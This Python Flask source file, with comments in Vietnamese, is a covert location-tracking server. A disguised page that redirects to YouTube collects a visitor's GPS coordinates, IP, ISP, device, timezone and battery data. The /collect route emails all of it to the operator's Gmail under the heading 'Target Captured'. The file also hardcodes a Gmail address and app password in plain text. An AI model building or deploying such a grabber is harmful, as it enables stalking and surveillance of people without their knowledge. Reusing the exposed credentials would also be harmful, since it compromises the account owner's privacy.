import os
import smtplib
import requests
from flask import Flask, request, jsonify, render_template
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

app = Flask(__name__)

# ================== CONFIG ==================
GMAIL_USER = "huynhtrongnghiamh@gmail.com"
GMAIL_APP_PASSWORD = "zvcc zjfo ovtm mznw"   # <-- thay bằng App Password
REDIRECT_URL = "https://www.youtube.com"
# ============================================


def get_ip_info(ip: str) -> dict:
    """Tra cứu nhà mạng / vị trí thô theo IP."""
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=6)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {}


def send_email(payload: dict, ip: str, ua: str):
    """Gửi toàn bộ dữ liệu về Gmail."""
    ip_info = get_ip_info(ip)
    lat = payload.get("lat")
    lon = payload.get("lon")
    accuracy = payload.get("accuracy")

    maps_link = ""
    if lat and lon:
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"

    body = f"""
    <h2>🎯 Target Captured</h2>
    <p><b>Thời gian:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>

    <h3>📍 GPS</h3>
    <ul>
        <li><b>Latitude:</b> {lat}</li>
        <li><b>Longitude:</b> {lon}</li>
        <li><b>Độ chính xác:</b> {accuracy} m</li>
        <li><b>Google Maps:</b> <a href="{maps_link}">{maps_link}</a></li>
    </ul>

    <h3>📱 Thiết bị</h3>
    <ul>
        <li><b>IP:</b> {ip}</li>
        <li><b>Nhà mạng / ISP:</b> {ip_info.get('org', 'N/A')}</li>
        <li><b>Thành phố (theo IP):</b> {ip_info.get('city', 'N/A')} - {ip_info.get('region', '')} - {ip_info.get('country_name', '')}</li>
        <li><b>User-Agent:</b> {ua}</li>
        <li><b>Platform:</b> {payload.get('platform', 'N/A')}</li>
        <li><b>Độ phân giải:</b> {payload.get('screen', 'N/A')}</li>
        <li><b>Ngôn ngữ:</b> {payload.get('language', 'N/A')}</li>
        <li><b>Timezone:</b> {payload.get('timezone', 'N/A')}</li>
        <li><b>Pin:</b> {payload.get('battery', 'N/A')}</li>
    </ul>
    """

    msg = MIMEMultipart("alternative")
    msg["Subject"] = f"[TRACK] {ip_info.get('city', ip)} - {lat},{lon}"
    msg["From"] = GMAIL_USER
    msg["To"] = GMAIL_USER
    msg.attach(MIMEText(body, "html"))

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(GMAIL_USER, GMAIL_APP_PASSWORD)
        server.send_message(msg)


@app.route("/")
def index():
    return render_template("index.html", redirect=REDIRECT_URL)


@app.route("/collect", methods=["POST"])
def collect():
    data = request.get_json(silent=True) or {}

    # Lấy IP thật (đi qua Cloudflare Tunnel)
    ip = (
        request.headers.get("CF-Connecting-IP")
        or request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
        or request.remote_addr
    )
    ua = request.headers.get("User-Agent", "Unknown")

    try:
        send_email(data, ip, ua)
    except Exception as e:
        print(f"[!] Mail lỗi: {e}")

    return jsonify({"status": "ok"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
